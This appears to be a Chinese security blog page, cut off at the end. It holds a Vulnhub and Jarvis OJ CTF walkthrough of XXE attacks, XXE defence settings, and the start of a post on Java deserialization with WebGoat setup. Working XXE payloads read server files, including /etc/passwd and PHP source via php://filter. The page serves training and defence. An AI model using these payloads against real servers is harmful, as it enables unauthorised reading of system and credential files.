src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image18.png" alt="image18"></p><h2 id="四-CTF-Vulnhub-XXE-安全真题复现-检测-利用-拓展-实战"><a href="#四-CTF-Vulnhub-XXE-安全真题复现-检测-利用-拓展-实战" class="headerlink" title="四.CTF-Vulnhub-XXE 安全真题复现-检测,利用,拓展,实战"></a>四.CTF-Vulnhub-XXE 安全真题复现-检测,利用,拓展,实战</h2><p>靶场下载地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/xxe/XXE.zip">https://download.vulnhub.com/xxe/XXE.zip</a></p><p>下载解压后会有如下文件</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image19.png" alt="image19"></p><p>删除mf文件然后用VMware打开ovf文件，导入到一个新的文件夹中，虚拟机导入成功！</p><h3 id="1-进入靶场-1"><a href="#1-进入靶场-1" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h3><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image20.png" alt="image20"></p><h3 id="2-对同网段的相似ip进行扫描"><a href="#2-对同网段的相似ip进行扫描" class="headerlink" title="2.对同网段的相似ip进行扫描"></a>2.对同网段的相似ip进行扫描</h3><p>已经知道虚拟机的ip网段是192.168.176.0</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image21.png" alt="image21"></p><p>使用nmap对该网段的所有ip扫描</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image22.png" alt="image22"></p><p>浏览器访问</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image23.png" alt="image23"></p><p>由于这是一个web网站，我们可以尝试扫描web目录，或者直接查看robots.txt找到关键目录</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image24.png" alt="image24"></p><p>进入/xxe/目录，发现是个登录框</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image25.png" alt="image25"></p><p>尝试抓包查看，发现登录参数采用xml格式传输，猜测这里有xxe漏洞</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image26.png" alt="image26"></p><p>尝试攻击一下，利用以下脚本读取xxe.php源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">admin</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功回显</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image27.png" alt="image27"></p><p><strong>注意：</strong>这里为什么使用php://filter协议而不是使用file://协议呢？原因是php://filter协议读取文件时，不需要文件的绝对地址，而file://协议需要文件的绝对地址。</p><p>将xxe.php改为admin.php，成功读取admin.php源码</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image28.png" alt="image28"></p><p>base64解码源代码后，分析，成功找到用户名密码</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image29.png" alt="image29"></p><p>密码是md5散列后的值，将其解密后得到原始密码为admin@123，使用用户名密码登录网站。</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image30.png" alt="image30"></p><p>登录成功后，显示如下页面，点击flag。</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image31.png" alt="image31"></p><p>点击flag后，跳转到flagmeout.php页面，但是显示无法打开该页面</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image32.png" alt="image32"></p><p>再次尝试读取flagmeout.php页面源代码（这里由于flagmeout.php文件在根目录下，而不是在/xxe/目录下，因此读取时需要写为./flagmeout.php）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">admin</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=./flagmeout.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功回显</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image33.png" alt="image33"></p><p>base64解码源代码，找到加密后的flag</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image34.png" alt="image34"></p><p>分析flag，发现是base32编码，将其在线解码，得到字符串如下</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image35.png" alt="image35"></p><p>该字符串是base64编码，再将其base64解码，成功得到flag地址：/etc/.flag.php</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image36.png" alt="image36"></p><p>继续使用脚本读取该文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">admin</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=/etc/.flag.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image37.png" alt="image37"></p><p>base64解码如下，分析，这是一段php代码</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image38.png" alt="image38"></p><p>将这段PHP代码在线运行一下，成功得到flag</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image39.png" alt="image39"></p><h2 id="五-CTF-Jarvis-OJ-Web-XXE安全真题复现-数据请求格式"><a href="#五-CTF-Jarvis-OJ-Web-XXE安全真题复现-数据请求格式" class="headerlink" title="五.CTF-Jarvis-OJ-Web-XXE安全真题复现-数据请求格式"></a>五.<strong>CTF-Jarvis-OJ-Web-XXE安全真题复现-数据请求格式</strong></h2><p>真题地址：<a target="_blank" rel="noopener" href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></p><p>抓包如下，数据包使用的是json格式，此处使用盲猜的方法检测是否存在xxe漏洞</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image40.png" alt="image40"></p><p>更改请求数据格式为：application/xml，使用以下脚本，成功读取服务器文件passwd内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image41.png" alt="image41"></p><h2 id="六-xxe安全漏洞自动化注射脚本工具-XXEinjector-Ruby"><a href="#六-xxe安全漏洞自动化注射脚本工具-XXEinjector-Ruby" class="headerlink" title="六.xxe安全漏洞自动化注射脚本工具-XXEinjector(Ruby)"></a>六.xxe安全漏洞自动化注射脚本工具-XXEinjector(Ruby)</h2><p>有空再看</p><p>XXEinjector是一款基于Ruby的XXE注入工具，它可以使用多种直接或间接带外方法来检索文件。其中，目录枚举功能只对Java应用程序有效，而暴力破解攻击需要使用到其他应用程序。</p><p>运行前提：Ruby运行环境，建议在kali环境下运行。</p><h2 id="七-xxe-漏洞修复与防御方案-php-java-python-过滤及禁用"><a href="#七-xxe-漏洞修复与防御方案-php-java-python-过滤及禁用" class="headerlink" title="七.xxe 漏洞修复与防御方案-php,java,python-过滤及禁用"></a>七.xxe 漏洞修复与防御方案-php,java,python-过滤及禁用</h2><h3 id="1-禁用外部实体"><a href="#1-禁用外部实体" class="headerlink" title="1.禁用外部实体"></a>1.禁用外部实体</h3><p><strong>PHP:</strong></p><p>libxml_disable_entity_loader(true);</p><p><strong>JAVA:</strong></p><p>DocumentBuilderFactory dbf=DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</p><p><strong>Python：</strong></p><p>from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p><h3 id="2-过滤用户提交的-XML-数据"><a href="#2-过滤用户提交的-XML-数据" class="headerlink" title="2.过滤用户提交的 XML 数据"></a>2.过滤用户提交的 XML 数据</h3><p>过滤关键词：&lt;!DOCTYPE 和&lt;!ENTITY，或者 SYSTEM 和 PUBLIC（这里可以用加密绕过）</p><h3 id="3-装WAF产品"><a href="#3-装WAF产品" class="headerlink" title="3.装WAF产品"></a>3.装WAF产品</h3></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/" class="post-title-link" itemprop="url">反序列化之PHP-JAVA全解（下）</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2022-03-24 19:02:06" itemprop="dateCreated datePublished" datetime="2022-03-24T19:02:06+08:00">2022-03-24</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2022-03-30 21:42:41" itemprop="dateModified" datetime="2022-03-30T21:42:41+08:00">2022-03-30</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全渗透学习</span></a> </span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>4.6k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>4 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="反序列化之PHP-JAVA全解（上）"><a href="#反序列化之PHP-JAVA全解（上）" class="headerlink" title="反序列化之PHP-JAVA全解（上）"></a>反序列化之PHP-JAVA全解（上）</h1><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image1.webp" alt="image1"></p><p><strong>为什么要用到序列化和反序列化？</strong></p><p><strong>举例：</strong></p><p>Web 服务器中的 Session 会话对象，当有10万用户并发访问，就有可能出现10万个 Session 对象，显然这种情况内存可能是吃不消的。</p><p>于是 Web 容器就会把一些 Session 先序列化，让他们离开内存空间，序列化到硬盘中，当需要调用时，再把保存在硬盘中的对象还原到内存中。</p><p>我们知道，当两个进程进行远程通信时，彼此可以发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。</p><p>同样的序列化与反序列化则实现了 <strong>进程通信间的对象传送</strong>，发送方需要把这个Java对象转换为字节序列，才能在网络上传送；接收方则需要把字节序列再恢复为Java对象。</p><p><strong>总结：</strong></p><p>Java 序列化和反序列化，其一，实现了数据的持久化，通过序列化可以把数据永久的保存在硬盘上；其二，利用序列化实现远程通信，即在网络上传递对象的字节序列。Java 序列化和反序列化，其一，实现了数据的持久化，通过序列化可以把数据永久的保存在硬盘上；其二，利用序列化实现远程通信，即在网络上传递对象的字节序列。</p><h2 id="一-Java中的序列化原理"><a href="#一-Java中的序列化原理" class="headerlink" title="一.Java中的序列化原理"></a>一.Java中的序列化原理</h2><h3 id="1-序列化"><a href="#1-序列化" class="headerlink" title="1.序列化"></a>1.序列化</h3><p>将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态<strong>写入到临时或持久性存储区</strong>。</p><h3 id="2-反序列化"><a href="#2-反序列化" class="headerlink" title="2.反序列化"></a>2.反序列化</h3><p>从<strong>存储区中读取</strong>该数据，并将其还原为对象的过程，称为反序列化。</p><h3 id="3-Java中的api实现"><a href="#3-Java中的api实现" class="headerlink" title="3.Java中的api实现"></a>3.Java中的api实现</h3><p>位置1：java.io.ObjectOutputStream</p><p>位置2：java.io.ObjectIutputStream</p><p><strong>序列化：</strong></p><p>java.io.ObjectOutputStream类—》writeObject()</p><p>该方法对参数指定的obj对象进行序列化，把字节序列写到一个目标输出流中，按照Java的标准约定是给文件一个.ser扩展名</p><p><strong>反序列化：</strong></p><p>java.io.ObjectIutputStream类—》readObject()</p><p>该方法从一个源输入流中读取字节序列，再把他们反序列化成一个对象，并将其返回</p><p><strong>特征：</strong></p><ul><li>一段数据以rO0AB开头，基本可以确认这串就是JAVA序列化base64加密的数据</li><li>一段数据以aced开头，基本可以确认这串就是JAVA序列化16进制</li></ul><h2 id="二-案例1——Java反序列化及命令执行代码测试"><a href="#二-案例1——Java反序列化及命令执行代码测试" class="headerlink" title="二.案例1——Java反序列化及命令执行代码测试"></a>二.案例1——<strong>Java反序列化及命令执行代码测试</strong></h2><h3 id="1-java反序列化代码测试"><a href="#1-java反序列化代码测试" class="headerlink" title="1.java反序列化代码测试"></a>1.java反序列化代码测试</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个可序列化的类，该类必须实现 java.io.Serializable 接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String sex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//序列化/反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeTest</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//实例化一个可序列化对象</span></span><br><span class="line">        serialPerson();</span><br><span class="line">        Person person = deserialPerson();</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">    <span class="comment">//将序列化后的对象写入到文件</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialPerson</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            Person person = <span class="keyword">new</span> Person();</span><br><span class="line">            person.name = <span class="string">&quot;朱易明&quot;</span>;</span><br><span class="line">            person.sex = <span class="string">&quot;男&quot;</span>;</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(</span><br><span class="line">                    <span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="string">&quot;d://java工程/person.txt&quot;</span>))</span><br><span class="line">            );</span><br><span class="line">            oos.writeObject(person);</span><br><span class="line">            System.out.println(<span class="string">&quot;person对象序列化成功！&quot;</span>);</span><br><span class="line">            oos.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Person <span class="title">deserialPerson</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(</span><br><span class="line">                <span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">&quot;d://java工程/person.txt&quot;</span>))</span><br><span class="line">        );</span><br><span class="line">        Person person = (Person)ois.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;person对象反序列化成功！&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;name:&quot;</span> + person.name);</span><br><span class="line">        System.out.println(<span class="string">&quot;sex:&quot;</span> + person.sex);</span><br><span class="line">        <span class="keyword">return</span> person;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image2.png" alt="image2"></p><p><strong>序列化过程：</strong>使用writeobject方法，将Person对象数据转化为txt乱码数据；</p><p>可以查看转化后的person.txt内容</p><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image3.png" alt="image3"></p><p><strong>反序列化过程：</strong>使用readobject方法，将txt乱码数据转化为Person对象数据。</p><p>运行结果就是将乱码值转化为正常值。</p><h3 id="2-命令执行代码测试"><a href="#2-命令执行代码测试" class="headerlink" title="2.命令执行代码测试"></a>2.命令执行代码测试</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException</span>&#123;</span><br><span class="line"></span><br><span class="line">        Process p=Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">                java.io.InputStream is=p.getInputStream();</span><br><span class="line">                BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line">                p.waitFor();</span><br><span class="line">                <span class="keyword">if</span> (p.exitValue()!=<span class="number">0</span>)&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;命令执行错误！&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                String s = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">while</span> ((s = reader.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    System.out.println(s);</span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>使用exec方法执行字符串命令并返回一个process对象</p></li><li><p>获取命令（process）的输入流给reader对象</p></li><li><p>读取输入流的内容，打印输出（反序列化）</p></li></ul><p><strong>运行结果</strong></p><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image4.png" alt="image4"></p><p>因此如果结合java反序列化+代码执行，将会给系统带来不可预料的危害。</p><h2 id="三-案例2——WebGoat-Javaweb靶场反序列化测试"><a href="#三-案例2——WebGoat-Javaweb靶场反序列化测试" class="headerlink" title="三.案例2——WebGoat_Javaweb靶场反序列化测试"></a>三.案例2——WebGoat_Javaweb靶场反序列化测试</h2><h3 id="1-靶场介绍"><a href="#1-靶场介绍" class="headerlink" title="1.靶场介绍"></a>1.靶场介绍</h3><p>WebGoat漏洞环境下载：<a target="_blank" rel="noopener" href="https://github.com/WebGoat/WebGoat/releases">https://github.com/WebGoat/WebGoat/releases</a></p><p>java8的话下载8.1.0版本</p><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image5.png" alt="image5"></p><p>我的win7虚拟机装了java11，因此在虚拟机上安装这个漏洞环境</p><p>下载好webgoat-server和webwolf两个文件</p><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image6.png" alt="image6"></p><p>将其放到java的bin目录下</p><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image7.png" alt="image7"></p><p>在本目录打开cmd窗口，执行命令<code>java --add-opens java.base/sun.nio.ch=ALL-UNNAMED --add-opens java.base/java.io=ALL-UNNAMED -Dfile.encoding=UTF-8 -jar webgoat-server-8.1.0.jar [--server.port=8080] [--server.address=localhost] [--hsqldb.port=9001]</code></p><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image8.png" alt="image8"></p><p><img 